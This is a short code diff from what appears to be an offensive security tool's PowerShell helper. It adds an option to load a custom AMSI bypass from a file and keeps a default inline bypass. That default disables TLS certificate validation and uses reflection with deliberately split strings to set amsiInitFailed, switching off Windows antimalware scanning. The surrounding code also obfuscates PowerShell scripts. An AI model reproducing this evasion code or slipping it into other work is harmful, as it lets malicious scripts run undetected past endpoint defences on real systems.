@@ -67,9 +67,15 @@ def obfs_ps_script(path_to_script):
 
             return strippedCode
 
-def create_ps_command(ps_command, force_ps32=False, dont_obfs=False):
-
-    amsi_bypass = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+def create_ps_command(ps_command, force_ps32=False, dont_obfs=False, custom_amsi=None):
+    if custom_amsi:
+        with open(custom_amsi) as file_in:
+            lines = []
+            for line in file_in:
+                lines.append(line)
+            amsi_bypass = ''.join(lines)
+    else:
+        amsi_bypass = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 try{
 [Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)
 }catch{}
